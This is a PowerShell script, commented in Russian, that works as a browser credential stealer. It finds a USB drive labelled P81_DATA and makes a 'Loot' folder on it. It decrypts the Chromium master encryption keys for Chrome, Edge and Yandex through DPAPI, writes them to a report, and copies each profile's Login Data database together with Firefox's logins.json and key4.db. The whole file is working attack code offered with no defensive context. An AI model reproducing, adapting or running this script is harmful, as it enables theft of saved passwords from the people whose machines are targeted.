# 1. Поиск флешки P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"

# 2. Папка назначения
$dest = "$usb\Loot_$(Get-Date -f mmss)"
mkdir $dest -Force | Out-Null

# 3. Подготовка дешифровки
Add-Type -AssemblyName System.Security
$report = "$dest\KEYS_ALL.txt"

# 4. CHROMIUM (Chrome, Edge, Yandex)
$browsers = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="EDGE";   p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    if (Test-Path $b.p) {
        # Ключ
        $ls = Join-Path $b.p "Local State"
        if (Test-Path $ls) {
            try {
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
                "[$($b.n)] Key: $([Convert]::ToBase64String($dec))" >> $report
            } catch {}
        }

        # Базы данных (жесткий поиск по папкам профилей)
        $profiles = Get-ChildItem -Path $b.p -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "Default|Profile" }
        foreach ($p in $profiles) {
            $dbPath = Join-Path $p.FullName "Login Data"
            if (Test-Path $dbPath) {
                # Формируем имя ВРУЧНУЮ: CHROME_Default_DB.db
                $cleanName = "$($b.n)_$($p.Name)_DB.db"
                Copy-Item $dbPath -Destination "$dest\$cleanName" -Force
            }
        }
    }
}

# 5. FIREFOX (тоже ручное именование)
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    $ffProfiles = Get-ChildItem $ffDir -Directory
    foreach ($fp in $ffProfiles) {
        $pName = $fp.Name
        
        # logins.json
        $jsonSrc = Join-Path $fp.FullName "logins.json"
        if (Test-Path $jsonSrc) {
            Copy-Item $jsonSrc -Destination "$dest\FIREFOX_$($pName)_logins.json" -Force
        }
        
        # key4.db
        $keySrc = Join-Path $fp.FullName "key4.db"
        if (Test-Path $keySrc) {
            Copy-Item $keySrc -Destination "$dest\FIREFOX_$($pName)_key4.db" -Force
        }
    }
}

exit
